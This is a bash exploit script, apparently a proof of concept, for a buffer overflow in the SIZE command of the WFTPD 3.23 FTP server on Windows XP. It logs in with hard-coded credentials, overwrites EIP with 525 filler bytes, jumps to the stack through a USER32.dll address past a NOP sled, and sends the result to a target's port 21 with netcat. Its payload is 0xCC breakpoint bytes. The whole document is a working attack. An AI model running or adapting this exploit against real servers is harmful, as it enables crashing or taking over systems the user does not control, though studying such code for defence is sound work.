#!/bin/bash
##########################################################################################################
#Title: WFTD 3.23 (SIZE)
#Author: Rio Atmadja
#OS Tested: XP SP3 32bit
##########################################################################################################

ip=$1 # get the ipaddress
if [ -z $1 ] 
then 
	echo -e "\033[31m [*]Usage: bash $0 <ip_address>"
else

	echo -e "\033[31m ============================================================================="
	echo -e "\033[33m 			WFTPD 3.23 Exploit (SIZE) 			       "
	echo -e "\033[33m 			      by orion					       "
	echo -e "\033[31m ============================================================================="


	echo "USER jeff" >> payload.txt
	echo "PASS 123qwe" >> payload.txt
	echo -n "SIZE /" >> payload.txt
	perl -e 'print "\x41"x525;' >> payload.txt # 525 overwrites the eip
	perl -e 'print "\x53\x93\x42\x7e";' >> payload.txt # jmp esp -> 7E429353 ( C:\Windows\System32\USER32.dll ) 
	perl -e 'print "\x90"x16;' >> payload.txt # send 16 bytes of nops
	perl -e 'print "\xcc"x1000;' >> payload.txt # here is the payload 
	echo " " >> payload.txt

	cat payload.txt | nc -nvv $ip 21 2>/dev/null && exit 0
	rm payload.txt
	echo -e "\033[31m [+] Launching Exploit againts " $ip " on port 21"
	echo -e "\033[31m [+] Done"

fi
